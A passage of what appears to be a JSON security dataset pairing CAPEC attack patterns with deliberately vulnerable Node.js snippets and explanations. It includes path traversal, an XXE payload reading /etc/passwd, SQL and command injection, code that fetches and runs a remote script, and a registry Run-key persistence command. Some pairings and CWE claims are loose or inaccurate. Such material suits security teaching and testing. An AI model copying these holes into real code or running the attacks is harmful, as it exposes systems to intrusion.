        "capec_name": "PHP Local File Inclusion",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\nconst url = require('url');\n\nhttp.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  const filePath = queryObject.file;\n\n  if (filePath) {\n    fs.readFile(filePath, 'utf8', (err, data) => {\n      if (err) {\n        res.writeHead(404, {'Content-Type': 'text/plain'});\n        res.write('File not found');\n      } else {\n        res.writeHead(200, {'Content-Type': 'text/plain'});\n        res.write(data);\n      }\n      res.end();\n    });\n  } else {\n    res.writeHead(400, {'Content-Type': 'text/plain'});\n    res.write('No file specified');\n    res.end();\n  }\n}).listen(8080);\n\nconsole.log('Server running at http://127.0.0.1:8080/');",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server reads a file specified by a query parameter in the URL and returns its contents. The main idea of the CAPEC (PHP Local File Inclusion) is represented here by allowing an attacker to specify an arbitrary file path via the 'file' query parameter. This can lead to the inclusion and execution of unintended files, similar to the vulnerabilities described in the related CWEs. Specifically, CWE-829 (Inclusion of Functionality from Untrusted Control Sphere) and CWE-98 (Improper Control of Filename for Include/Require Statement) are demonstrated by the lack of validation on the 'file' parameter, allowing potential exploitation."
    },
    {
        "capec_id": "253",
        "capec_name": "Remote Code Inclusion",
        "code_snippet": "const http = require('http');\nconst vm = require('vm');\n\nhttp.get('http://example.com/malicious.js', (res) => {\n  let code = '';\n  res.on('data', (chunk) => { code += chunk; });\n  res.on('end', () => {\n    vm.runInThisContext(code); // Execute the downloaded code without integrity check\n  });\n});",
        "description": "This JavaScript code snippet demonstrates a Remote Code Inclusion vulnerability. It uses the 'http' module to download a JavaScript file from a remote server ('http://example.com/malicious.js') and then executes the downloaded code using 'vm.runInThisContext'. This approach embodies the main idea of CAPEC-remote code inclusion by loading and executing code from an untrusted remote source. The code snippet also touches on related CWEs: CWE-494 (Download of Code Without Integrity Check) as it does not verify the integrity or origin of the downloaded code, and CWE-829 (Inclusion of Functionality from Untrusted Control Sphere) as it includes and executes code from an external source."
    },
    {
        "capec_id": "254",
        "capec_name": "DEPRECATED: DTD Injection in a SOAP Message",
        "code_snippet": "const xml2js = require('xml2js');\nconst fs = require('fs');\n\nconst xml = `<?xml version=\"1.0\"?>\n<!DOCTYPE root [\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<root>&xxe;</root>`;\n\nxml2js.parseString(xml, (err, result) => {\n  if (err) {\n    console.error('Error parsing XML:', err);\n  } else {\n    console.log('Parsed result:', result);\n  }\n});",
        "description": "This JavaScript code snippet demonstrates a DTD Injection vulnerability using the xml2js library. The XML input includes a Document Type Definition (DTD) that defines an external entity 'xxe' referencing the system file '/etc/passwd'. When the XML is parsed, the external entity is expanded, potentially exposing sensitive information. This example embodies the main idea of CAPEC-228 (DTD Injection) and highlights CWE-827 (Improper Control of Document Type Definition) and CWE-776 (Improper Restriction of Recursive Entity References in DTDs)."
    },
    {
        "capec_id": "256",
        "capec_name": "SOAP Array Overflow",
        "code_snippet": "const http = require('http');\nconst xml2js = require('xml2js');\n\nconst server = http.createServer((req, res) => {\n  let body = '';\n  req.on('data', chunk => {\n    body += chunk.toString();\n  });\n  req.on('end', () => {\n    xml2js.parseString(body, (err, result) => {\n      if (err) {\n        res.writeHead(400, {'Content-Type': 'text/plain'});\n        res.end('Invalid XML');\n        return;\n      }\n      const arraySize = parseInt(result.array.$.size, 10);\n      const arrayData = result.array.item;\n      const buffer = Buffer.alloc(arraySize * 4); // Assume each item is 4 bytes\n      for (let i = 0; i < arrayData.length; i++) {\n        buffer.writeInt32LE(arrayData[i], i * 4);\n      }\n      res.writeHead(200, {'Content-Type': 'text/plain'});\n      res.end('Array processed');\n    });\n  });\n});\n\nserver.listen(8080, () => {\n  console.log('Server running on port 8080');\n});",
        "description": "This JavaScript code snippet sets up an HTTP server that processes SOAP requests containing an array. The server reads the array size from the XML request and allocates a buffer based on this size. It then writes the array data into the buffer. The vulnerability arises because the server trusts the array size specified in the request without verifying it against the actual data length, potentially leading to a buffer overflow if the actual data length exceeds the allocated buffer size. This embodies the main idea of the CAPEC 'SOAP Array Overflow' and demonstrates related CWEs such as 'Buffer Access with Incorrect Length Value' and 'Improper Handling of Length Parameter Inconsistency'."
    },
    {
        "capec_id": "257",
        "capec_name": "DEPRECATED: Abuse of Transaction Data Structure",
        "code_snippet": "const fs = require('fs');\n\n// Simulate a transaction data structure\nlet transaction = {\n  id: 1,\n  amount: 100,\n  status: 'pending'\n};\n\n// Log transaction data to a file (CWE-532)\nfs.appendFile('transaction.log', JSON.stringify(transaction), (err) => {\n  if (err) throw err;\n  console.log('Transaction data logged.');\n});\n\n// Simulate an attacker modifying the transaction data (CWE-766, CWE-767)\ntransaction.amount = 1000;\ntransaction.status = 'completed';\n\n// Log the modified transaction data to a file (CWE-532)\nfs.appendFile('transaction.log', JSON.stringify(transaction), (err) => {\n  if (err) throw err;\n  console.log('Modified transaction data logged.');\n});\n\n// Simulate an authentication bypass (CWE-287)\nlet userAuthenticated = false;\nif (!userAuthenticated) {\n  console.log('Authentication bypassed. Access granted.');\n}\n\n// Log sensitive information without confidentiality (CWE-493)\nfs.appendFile('debug.log', 'User authentication status: ' + userAuthenticated, (err) => {\n  if (err) throw err;\n  console.log('Debug information logged.');\n});",
        "description": "This JavaScript code snippet demonstrates several deprecated weaknesses related to the abuse of transaction data structures. The code simulates a transaction and logs its data to a file, representing CWE-532 (Information Exposure Through Log Files). It then modifies the transaction data, illustrating CWE-766 and CWE-767 (Failure to Protect Stored Data from Modification). The code also simulates an authentication bypass (CWE-287) and logs sensitive information without ensuring confidentiality (CWE-493). The overall idea is to show how transaction data can be abused and exposed through improper handling and logging practices."
    },
    {
        "capec_id": "258",
        "capec_name": "DEPRECATED: Passively Sniffing and Capturing Application Code Bound for an Authorized Client During Dynamic Update",
        "code_snippet": "const net = require('net');\n\nconst client = new net.Socket();\nclient.connect(1337, '127.0.0.1', () => {\n    console.log('Connected');\n    client.write('AUTH user:password'); // Client-side authentication\n});\n\nclient.on('data', (data) => {\n    console.log('Received: ' + data);\n    client.destroy(); // Close the connection after receiving data\n});\n\nclient.on('close', () => {\n    console.log('Connection closed');\n});\n\n// Sniffer to capture and replay traffic\nconst sniffer = new net.Socket();\nsniffer.connect(1337, '127.0.0.1', () => {\n    console.log('Sniffer Connected');\n    sniffer.write('AUTH user:password'); // Replay captured authentication\n});\n\nsniffer.on('data', (data) => {\n    console.log('Sniffer Received: ' + data);\n    sniffer.destroy(); // Close the connection after receiving data\n});\n\nsniffer.on('close', () => {\n    console.log('Sniffer Connection closed');\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerable client-server interaction where authentication is performed on the client side. The client connects to a server and sends an authentication message ('AUTH user:password'). A sniffer (malicious client) then connects to the same server and replays the captured authentication message to gain unauthorized access. This embodies the main idea of CAPEC-65, where an attacker passively sniffs and captures application code or authentication data during a dynamic update and replays it to bypass authentication. The code also highlights CWE-294 (Authentication Bypass by Capture-replay) and CWE-603 (Use of Client-Side Authentication)."
    },
    {
        "capec_id": "259",
        "capec_name": "DEPRECATED: Passively Sniffing and Capturing Application Code Bound for an Authorized Client During Patching",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\n\nhttp.createServer((req, res) => {\n  if (req.url === '/patch' && req.method === 'POST') {\n    let body = '';\n    req.on('data', chunk => {\n      body += chunk.toString();\n    });\n    req.on('end', () => {\n      // Vulnerable: Saving patch data without proper authentication\n      fs.writeFile('patch_data.txt', body, (err) => {\n        if (err) throw err;\n        res.end('Patch data saved');\n      });\n    });\n  } else {\n    res.end('Invalid request');\n  }\n}).listen(8080, () => console.log('Server running on port 8080'));\n\n// Client-side authentication (vulnerable)\nfunction authenticateClient(clientId) {\n  // Vulnerable: Authentication logic on client-side\n  return clientId === 'authorizedClient';\n}\n\n// Example usage\nif (authenticateClient('authorizedClient')) {\n  console.log('Client authenticated');\n} else {\n  console.log('Client authentication failed');\n}",
        "description": "This JavaScript code snippet demonstrates a vulnerable server that listens for patch data on a specific endpoint and saves it without proper server-side authentication. The server writes the received patch data to a file, which could be intercepted by an attacker. Additionally, the code includes a client-side authentication function, which is inherently insecure as it can be easily bypassed by modifying the client. This example embodies the main idea of CAPEC-65, highlighting vulnerabilities such as authentication bypass (CWE-294) and the use of client-side authentication (CWE-603)."
    },
    {
        "capec_id": "260",
        "capec_name": "DEPRECATED: Passively Sniffing and Capturing Application Code Bound for an Authorized Client During Initial Distribution",
        "code_snippet": "const net = require('net');\n\nconst client = new net.Socket();\nclient.connect(8080, '127.0.0.1', () => {\n  console.log('Connected');\n  client.write('AUTH user:password'); // Client-side authentication\n});\n\nclient.on('data', (data) => {\n  console.log('Received: ' + data);\n  client.destroy(); // Close the connection after receiving data\n});\n\nclient.on('close', () => {\n  console.log('Connection closed');\n});\n\n// Sniffer to capture and replay authentication\nconst sniffer = new net.Socket();\nsniffer.connect(8080, '127.0.0.1', () => {\n  console.log('Sniffer Connected');\n  sniffer.write('AUTH user:password'); // Replay captured authentication\n});\n\nsniffer.on('data', (data) => {\n  console.log('Sniffer Received: ' + data);\n  sniffer.destroy(); // Close the connection after receiving data\n});\n\nsniffer.on('close', () => {\n  console.log('Sniffer Connection closed');\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerable client-server authentication mechanism and a sniffer that captures and replays the authentication data. The client connects to a server and sends an authentication message ('AUTH user:password'). The sniffer then connects to the same server and replays the captured authentication message, bypassing the authentication process. This embodies the main idea of CAPEC-65, where an attacker can sniff and capture application code or data during initial distribution and use it to bypass authentication (CWE-294). The use of client-side authentication (CWE-603) is also highlighted, showing how it can be exploited by a modified client."
    },
    {
        "capec_id": "261",
        "capec_name": "Fuzzing for garnering other adjacent user/sensitive data",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst bodyParser = require('body-parser');\nconst mysql = require('mysql');\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\nconst db = mysql.createConnection({\n  host: 'localhost',\n  user: 'root',\n  password: '',\n  database: 'test_db'\n});\n\ndb.connect((err) => {\n  if (err) throw err;\n  console.log('Connected to database');\n});\n\napp.post('/search', (req, res) => {\n  const searchTerm = req.body.searchTerm;\n  const query = `SELECT * FROM users WHERE name LIKE '%${searchTerm}%'`;\n  db.query(query, (err, results) => {\n    if (err) {\n      res.status(500).send(`Error: ${err.message}`);\n    } else {\n      res.json(results);\n    }\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet sets up an Express.js server with a MySQL database connection. It includes a POST endpoint '/search' that takes a 'searchTerm' from the request body and constructs an SQL query to search for users by name. The query is vulnerable to SQL Injection (CWE-89) because it directly incorporates user input without proper sanitization. Additionally, if an error occurs during the query execution, the error message is sent back to the client, potentially exposing sensitive information (CWE-209). This code exemplifies the CAPEC scenario where an adversary can send modified queries to extract sensitive information from the database."
    },
    {
        "capec_id": "263",
        "capec_name": "Force Use of Corrupted Files",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction processFile(filePath) {\n  if (!fs.existsSync(filePath)) {\n    throw new Error('File does not exist');\n  }\n\n  const fileExtension = path.extname(filePath);\n  if (fileExtension !== '.txt') {\n    throw new Error('Unsupported file type');\n  }\n\n  const fileContent = fs.readFileSync(filePath, 'utf8');\n  if (fileContent.includes('<script>')) {\n    throw new Error('File contains potentially dangerous content');\n  }\n\n  console.log('Processing file:', filePath);\n  // Further file processing logic here\n}\n\n// Example usage\ntry {\n  processFile('user_upload.txt');\n} catch (error) {\n  console.error('Error processing file:', error.message);\n}",
        "description": "This JavaScript code snippet demonstrates a vulnerable file processing function that embodies the main idea of the CAPEC 'Force Use of Corrupted Files'. The function 'processFile' takes a file path as input and performs several checks: it verifies the file exists, checks the file extension, and inspects the file content for potentially dangerous content. However, this code is vulnerable to several issues: it relies on the file extension to determine the file type (CWE-646), it does not securely handle temporary files (CWE-377), and it does not validate the source of the file (CWE-829). An attacker could exploit these weaknesses by uploading a corrupted or malicious file, leading to potential denial of service or other harmful effects."
    },
    {
        "capec_id": "264",
        "capec_name": "DEPRECATED: Environment Variable Manipulation",
        "code_snippet": "const exec = require('child_process').exec;\n\n// CWE-1108: Excessive Reliance on Global Variables\nlet globalEnvVar = process.env.PATH;\n\nfunction runCommand(userInput) {\n  // CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')\n  let command = `echo ${userInput}`;\n  exec(command, (error, stdout, stderr) => {\n    if (error) {\n      console.error(`exec error: ${error}`);\n      return;\n    }\n    console.log(`stdout: ${stdout}`);\n    console.error(`stderr: ${stderr}`);\n  });\n}\n\n// CWE-1126: Declaration of Variable with Unnecessarily Wide Scope\nlet userInput = process.argv[2];\nrunCommand(userInput);",
        "description": "This JavaScript code snippet demonstrates a vulnerable pattern related to environment variable manipulation and several related CWEs. The code uses the 'exec' function from the 'child_process' module to execute a command that includes user input without proper sanitization, leading to potential command injection (CWE-95). The global variable 'globalEnvVar' (CWE-1108) is used to store an environment variable, which is unnecessary and risky. Additionally, the 'userInput' variable is declared with unnecessarily wide scope (CWE-1126), making it accessible throughout the script. This code highlights the risks of improper handling of environment variables and user inputs, which can lead to security vulnerabilities."
    },
    {
        "capec_id": "265",
        "capec_name": "DEPRECATED: Global variable manipulation",
        "code_snippet": "var globalVar = 'sensitiveData';\n\nfunction manipulateGlobalVar(userInput) {\n    eval('globalVar = ' + userInput);\n}\n\nmanipulateGlobalVar('\"newData\"');\nconsole.log(globalVar);",
        "description": "This JavaScript code snippet demonstrates the vulnerability of global variable manipulation. The global variable 'globalVar' is declared and holds sensitive data. The function 'manipulateGlobalVar' takes user input and uses the 'eval' function to dynamically modify the global variable. This represents CWE-1108 (Excessive Reliance on Global Variables) and CWE-627 (Dynamic Variable Evaluation). The use of 'eval' with user input can lead to arbitrary code execution, highlighting CWE-914 (Improper Control of Dynamically-Identified Variables) and CWE-913 (Improper Control of Dynamically-Managed Code Resources). The global variable's unnecessarily wide scope is an example of CWE-1126 (Declaration of Variable with Unnecessarily Wide Scope)."
    },
    {
        "capec_id": "266",
        "capec_name": "DEPRECATED: Manipulate Canonicalization",
        "code_snippet": "const userInput = \"../../etc/passwd\";\n\nfunction validateInput(input) {\n  const validPattern = /^[a-zA-Z0-9_]+$/;\n  return validPattern.test(input);\n}\n\nfunction canonicalizeInput(input) {\n  const path = require('path');\n  return path.normalize(input);\n}\n\nif (validateInput(userInput)) {\n  const safeInput = canonicalizeInput(userInput);\n  console.log(`Safe input: ${safeInput}`);\n} else {\n  console.log('Invalid input detected');\n}",
        "description": "This JavaScript code snippet demonstrates a vulnerability related to CAPEC 'Manipulate Canonicalization' and CWE-180 'Incorrect Behavior Order: Validate Before Canonicalize'. The code first validates the user input using a regular expression to ensure it only contains alphanumeric characters and underscores. However, it performs this validation before canonicalizing the input. The canonicalization step, which normalizes the input path, is done after validation. This order of operations can lead to security issues because the input might be considered valid initially but become invalid or dangerous after canonicalization. For example, the input '../../etc/passwd' would pass the validation but could be normalized to an unintended path, potentially leading to directory traversal attacks."
    },
    {
        "capec_id": "267",
        "capec_name": "Leverage Alternate Encoding",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst port = 3000;\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/submit', (req, res) => {\n  let userInput = req.body.input;\n  // Validate input before canonicalization\n  if (!/^[a-zA-Z0-9]+$/.test(userInput)) {\n    return res.status(400).send('Invalid input');\n  }\n  // Canonicalize input\n  userInput = decodeURIComponent(userInput);\n  // Use the input in a file path\n  const filePath = `/uploads/${userInput}.txt`;\n  res.send(`File path is: ${filePath}`);\n});\n\napp.listen(port, () => {\n  console.log(`Server running at http://localhost:${port}/`);\n});",
        "description": "This JavaScript code snippet sets up an Express.js server that handles POST requests to the '/submit' endpoint. The server receives user input, validates it using a regular expression to ensure it only contains alphanumeric characters, and then decodes the input using `decodeURIComponent`. This sequence represents the CAPEC 'Leverage Alternate Encoding' by demonstrating improper handling of alternate encoding (CWE-173) and incorrect behavior order (CWE-180). The validation occurs before canonicalization, which can lead to security issues if the input contains encoded harmful characters. The code also constructs a file path using the user input, illustrating CWE-73 (External Control of File Name or Path)."
    },
    {
        "capec_id": "268",
        "capec_name": "Audit Log Manipulation",
        "code_snippet": "const fs = require('fs');\nconst logFilePath = '/var/log/app.log';\n\nfunction logEvent(event) {\n  const logEntry = `${new Date().toISOString()} - ${event}\\n`;\n  fs.appendFileSync(logFilePath, logEntry);\n}\n\nfunction manipulateLog() {\n  const maliciousEntry = '2023-10-01T00:00:00.000Z - User login: admin\\n';\n  fs.appendFileSync(logFilePath, maliciousEntry);\n}\n\n// Example usage\nlogEvent('User login: user123');\nmanipulateLog();",
        "description": "This JavaScript code snippet demonstrates a basic logging mechanism and how an attacker might manipulate the log file. The `logEvent` function appends a log entry to a log file, while the `manipulateLog` function appends a forged log entry. This example highlights the vulnerability described in CAPEC-116: Audit Log Manipulation. The code does not implement proper access controls or output neutralization, making it susceptible to CWE-117 (Improper Output Neutralization for Logs) and CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere). Additionally, the log file could potentially contain sensitive information (CWE-532) and may log excessive data (CWE-779) or insufficient data (CWE-778)."
    },
    {
        "capec_id": "269",
        "capec_name": "DEPRECATED: Registry Manipulation",
        "code_snippet": "const fs = require('fs');\nconst registryKey = 'HKEY_LOCAL_MACHINE\\\\Software\\\\MyApp';\nconst sensitiveData = 'password123';\n\n// Insecurely storing sensitive data in the registry\nfs.writeFileSync(`/proc/registry/${registryKey}`, sensitiveData, 'utf8');\n\n// Incomplete documentation of program execution\nfunction executeTask() {\n  // Privilege context switching error\n  process.setuid(0); // Switch to root\n  // Task execution code here\n  process.setuid(process.env.USER); // Switch back to original user\n}\n\nexecuteTask();",
        "description": "This JavaScript code snippet demonstrates several vulnerabilities related to registry manipulation and other related weaknesses. It insecurely stores sensitive information (a password) in the registry in cleartext, which is a direct example of CWE-314. The `executeTask` function shows an incomplete documentation of program execution (CWE-1112) and a privilege context switching error (CWE-270) by switching to the root user and then back to the original user without proper checks. This code embodies the main idea of CAPEC-203 by manipulating application registry values insecurely and highlights the associated weaknesses."
    },
    {
        "capec_id": "270",
        "capec_name": "Modification of Registry Run Keys",
        "code_snippet": "const { exec } = require('child_process');\nconst registryKey = 'HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run';\nconst appName = 'MaliciousApp';\nconst appPath = 'C:\\\\Path\\\\To\\\\MaliciousApp.exe';\n\nexec(`reg add \"${registryKey}\" /v \"${appName}\" /t REG_SZ /d \"${appPath}\" /f`, (error, stdout, stderr) => {\n  if (error) {\n    console.error(`Error: ${error.message}`);\n    return;\n  }\n  if (stderr) {\n    console.error(`Stderr: ${stderr}`);\n    return;\n  }\n  console.log(`Stdout: ${stdout}`);\n});",
        "description": "This JavaScript code snippet demonstrates how an adversary could add a new entry to the Windows registry 'run keys' to ensure that a malicious application is executed every time a user logs in. The 'exec' function from the 'child_process' module is used to run a command that adds a new registry key under 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'. The key is named 'MaliciousApp' and points to the executable path of the malicious application. This embodies the CAPEC of 'Modification of Registry Run Keys' by ensuring persistent execution of the malicious application with the user's permissions. The code also touches on CWE-15 (External Control of System or Configuration Setting) by allowing external control over the registry settings."
    },
    {
        "capec_id": "271",
        "capec_name": "Schema Poisoning",
        "code_snippet": "const express = require('express');\nconst fs = require('fs');\nconst app = express();\n\n// Load schema from external file\nlet schema = JSON.parse(fs.readFileSync('schema.json', 'utf8'));\n\napp.post('/updateSchema', (req, res) => {\n  // External control of system setting (CWE-15)\n  schema = req.body.newSchema;\n  fs.writeFileSync('schema.json', JSON.stringify(schema));\n  res.send('Schema updated');\n});\n\napp.post('/submitData', (req, res) => {\n  // Trust boundary violation (CWE-501)\n  const data = req.body;\n  if (!validateDataAgainstSchema(data, schema)) {\n    return res.status(400).send('Invalid data');\n  }\n  // Process data...\n  res.send('Data accepted');\n});\n\nfunction validateDataAgainstSchema(data, schema) {\n  // Simple validation logic\n  for (let key in schema) {\n    if (!data.hasOwnProperty(key)) {\n      return false;\n    }\n  }\n  return true;\n}\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet demonstrates a basic Express.js application that is vulnerable to schema poisoning. The application loads a schema from an external file and allows users to update this schema via a POST request to the '/updateSchema' endpoint. This represents CWE-15 (External Control of System or Configuration Setting) as it allows external control over the schema. The '/submitData' endpoint accepts data submissions and validates them against the potentially poisoned schema, representing CWE-501 (Trust Boundary Violation) as it mixes trusted and untrusted data. The code does not include proper validation or sanitization, making it susceptible to schema poisoning attacks, where an adversary can modify the schema to undermine the application's security."
    },
    {
        "capec_id": "272",
        "capec_name": "Protocol Manipulation",
        "code_snippet": "const net = require('net');\n\nconst client = new net.Socket();\nclient.connect(1337, '127.0.0.1', () => {\n    console.log('Connected');\n    // CWE-301: Reflection Attack in an Authentication Protocol\n    client.write('AUTH user:password');\n});\n\nclient.on('data', (data) => {\n    console.log('Received: ' + data);\n    // CWE-294: Authentication Bypass by Capture-replay\n    if (data.toString() === 'AUTH_SUCCESS') {\n        client.write('REPLAY AUTH user:password');\n    }\n    // CWE-924: Improper Enforcement of Message Integrity During Transmission\n    if (data.toString().includes('MODIFIED')) {\n        console.log('Message integrity compromised');\n    }\n});\n\nclient.on('close', () => {\n    console.log('Connection closed');\n});\n\n// CWE-940: Improper Verification of Source of a Communication Channel\nconst server = net.createServer((socket) => {\n    socket.on('data', (data) => {\n        console.log('Server received: ' + data);\n        if (data.toString().startsWith('AUTH')) {\n            socket.write('AUTH_SUCCESS');\n        }\n    });\n});\n\nserver.listen(1337, '127.0.0.1');",
        "description": "This JavaScript code snippet demonstrates a simple TCP client-server communication using the 'net' module. The client connects to the server and sends an authentication message. The server responds with an 'AUTH_SUCCESS' message. The client then attempts to replay the authentication message, illustrating CWE-294 (Authentication Bypass by Capture-replay). The server does not verify the source of the communication channel, representing CWE-940 (Improper Verification of Source of a Communication Channel). Additionally, the code checks for message integrity issues, representing CWE-924 (Improper Enforcement of Message Integrity During Transmission). The overall scenario embodies the main idea of CAPEC-272 (Protocol Manipulation), where an adversary can manipulate the communication protocol to perform various attacks."
    },
    {
        "capec_id": "273",
        "capec_name": "HTTP Response Smuggling",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  let body = '';\n  req.on('data', chunk => {\n    body += chunk;\n  });\n  req.on('end', () => {\n    // Vulnerable to HTTP Response Smuggling\n    if (body.includes('\\r\\n')) {\n      res.writeHead(200, { 'Content-Type': 'text/plain' });\n      res.end('HTTP/1.1 200 OK\\r\\nContent-Length: 13\\r\\n\\r\\nHello, world!\\r\\nHTTP/1.1 200 OK\\r\\nContent-Length: 13\\r\\n\\r\\nHello, world!');\n    } else {\n      res.writeHead(200, { 'Content-Type': 'text/plain' });\n      res.end('Hello, world!');\n    }\n  });\n}).listen(8080);",
        "description": "This JavaScript code snippet creates an HTTP server using Node.js. The server reads incoming request data and checks if the body contains CRLF sequences (\\r\\n). If such sequences are found, it constructs a response that includes multiple HTTP responses within a single response, demonstrating HTTP Response Smuggling. This vulnerability arises from improper neutralization of special elements (CWE-74) and inconsistent interpretation of HTTP requests (CWE-444). The code also highlights the risk of HTTP Request/Response Splitting (CWE-113) by not properly handling CRLF sequences in the HTTP headers."
    },
    {
        "capec_id": "274",
        "capec_name": "HTTP Verb Tampering",
        "code_snippet": "const http = require('http');\n\nconst server = http.createServer((req, res) => {\n  if (req.method === 'GET') {\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Access granted for GET request');\n  } else if (req.method === 'POST') {\n    res.writeHead(403, {'Content-Type': 'text/plain'});\n    res.end('Access denied for POST request');\n  } else {\n    res.writeHead(403, {'Content-Type': 'text/plain'});\n    res.end('Access denied');\n  }\n});\n\nserver.listen(3000, () => {\n  console.log('Server running at http://127.0.0.1:3000/');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server checks the HTTP verb of incoming requests and grants access only if the verb is 'GET'. If the verb is 'POST' or any other method, access is denied. This embodies the main idea of CAPEC-274 (HTTP Verb Tampering) by demonstrating how an attacker could potentially bypass access restrictions by manipulating the HTTP verb. The code also highlights CWE-654 (Reliance on a Single Factor in a Security Decision) as it relies solely on the HTTP verb to make access control decisions. Additionally, it touches on CWE-302 (Authentication Bypass by Assumed-Immutable Data) since the HTTP verb is assumed to be immutable and trustworthy, which can be exploited by an attacker."
    },
    {
        "capec_id": "275",
        "capec_name": "DNS Rebinding",
        "code_snippet": "const http = require('http');\nconst dns = require('dns');\n\nconst server = http.createServer((req, res) => {\n  const targetHost = 'malicious.example.com';\n  dns.resolve4(targetHost, (err, addresses) => {\n    if (err) throw err;\n    const initialIP = addresses[0];\n    console.log(`Initial IP: ${initialIP}`);\n\n    // Simulate a delay before rebinding\n    setTimeout(() => {\n      dns.resolve4(targetHost, (err, newAddresses) => {\n        if (err) throw err;\n        const newIP = newAddresses[0];\n        console.log(`New IP: ${newIP}`);\n\n        // Simulate accessing an internal resource\n        http.get(`http://${newIP}/internal-resource`, (internalRes) => {\n          let data = '';\n          internalRes.on('data', (chunk) => {\n            data += chunk;\n          });\n          internalRes.on('end', () => {\n            res.writeHead(200, {'Content-Type': 'text/plain'});\n            res.end(`Internal Data: ${data}`);\n          });\n        }).on('error', (e) => {\n          console.error(`Got error: ${e.message}`);\n        });\n      });\n    }, 5000); // 5 seconds delay to simulate rebind\n  });\n});\n\nserver.listen(8080, '0.0.0.0', () => {\n  console.log('Server running at http://0.0.0.0:8080/');\n});",
        "description": "This JavaScript code snippet demonstrates a DNS Rebinding attack using Node.js. The server initially resolves the IP address of a malicious domain ('malicious.example.com'). After a delay, it resolves the domain again to get a new IP address, simulating the DNS rebind. The new IP address is assumed to be an internal address within the target organization. The server then makes an HTTP request to this internal address to access potentially sensitive internal resources. The code also binds the server to '0.0.0.0', making it accessible from any network interface, which is related to CWE-1327. This example highlights the vulnerability of relying on DNS resolution for security-critical actions (CWE-350) and the potential risks of open redirects (CWE-601) if the internal resource URL is user-controlled."
    },
    {
        "capec_id": "276",
        "capec_name": "Inter-component Protocol Manipulation",
        "code_snippet": "const net = require('net');\n\nconst client = new net.Socket();\nclient.connect(1337, '127.0.0.1', () => {\n    console.log('Connected');\n    // Sending sensitive data in cleartext\n    client.write('username=admin&password=secret');\n});\n\nclient.on('data', (data) => {\n    console.log('Received: ' + data);\n    // Improper neutralization of received data\n    if (data.toString().includes('success')) {\n        console.log('Login successful');\n    }\n    client.destroy();\n});\n\nclient.on('close', () => {\n    console.log('Connection closed');\n});",
        "description": "This JavaScript code snippet demonstrates a TCP client that connects to a server and sends sensitive information (username and password) in cleartext. This embodies the CAPEC concept of 'Inter-component Protocol Manipulation' by showcasing vulnerabilities such as CWE-319 (Cleartext Transmission of Sensitive Information) and CWE-707 (Improper Neutralization). The code does not ensure the integrity of the message during transmission (CWE-924) and assumes that the received data is trustworthy without proper validation. This can allow an adversary to intercept, manipulate, or impersonate communication between components."
    },
    {
        "capec_id": "277",
        "capec_name": "Data Interchange Protocol Manipulation",
        "code_snippet": "const xml2js = require('xml2js');\nconst fs = require('fs');\n\n// Read XML data from a file\nfs.readFile('data.xml', 'utf8', (err, data) => {\n  if (err) throw err;\n\n  // Parse the XML data\n  xml2js.parseString(data, (err, result) => {\n    if (err) throw err;\n\n    // Assume the 'user' field is immutable and trusted\n    const user = result.session.user[0];\n\n    // Incorrectly convert user role\n    const userRole = user.role[0] === 'admin' ? 'admin' : 'user';\n\n    // Sensitive information included in the response\n    const response = `<response><user>${user}</user><role>${userRole}</role><token>${result.session.token[0]}</token></response>`;\n\n    // Send the response\n    console.log(response);\n  });\n});",
        "description": "This JavaScript code snippet reads and parses an XML file, assuming that certain fields within the XML (like 'user' and 'role') are immutable and trusted. It then incorrectly converts the user role and includes sensitive information (like a session token) in the response. This embodies the main idea of CAPEC-272 (Data Interchange Protocol Manipulation) by demonstrating how improper neutralization, incorrect conversion of security identifiers, reliance on data layout, and insertion of sensitive information can lead to vulnerabilities. Specifically, it shows how an attacker could manipulate the XML data to impersonate users, gain unauthorized access, or extract sensitive information."
    },
    {
        "capec_id": "278",
        "capec_name": "Web Services Protocol Manipulation",
        "code_snippet": "const http = require('http');\n\nconst options = {\n  hostname: 'example.com',\n  port: 80,\n  path: '/api/data',\n  method: 'POST',\n  headers: {\n    'Content-Type': 'application/json'\n  }\n};\n\nconst req = http.request(options, (res) => {\n  let data = '';\n  res.on('data', (chunk) => {\n    data += chunk;\n  });\n  res.on('end', () => {\n    console.log('Response:', data);\n  });\n});\n\nreq.on('error', (e) => {\n  console.error(`Problem with request: ${e.message}`);\n});\n\n// Manipulating the request body to include unexpected values\nconst maliciousPayload = JSON.stringify({\n  userId: '1 OR 1=1', // SQL Injection\n  action: 'delete', // Unauthorized action\n  target: 'all' // Broad target\n});\n\nreq.write(maliciousPayload);\nreq.end();",
        "description": "This JavaScript code snippet demonstrates a web service protocol manipulation attack. It constructs an HTTP POST request to a web service endpoint with manipulated parameters. The payload includes a SQL injection attempt ('1 OR 1=1') and an unauthorized action ('delete') targeting all records. This embodies the CAPEC idea of manipulating web service protocols to cause unintended behavior, such as unauthorized data access or actions. The code also touches on related CWEs like improper neutralization (CWE-707) by not sanitizing input, and client-side enforcement of server-side security (CWE-602) by assuming the client will not send malicious requests."
    },
    {
        "capec_id": "279",
        "capec_name": "SOAP Manipulation",
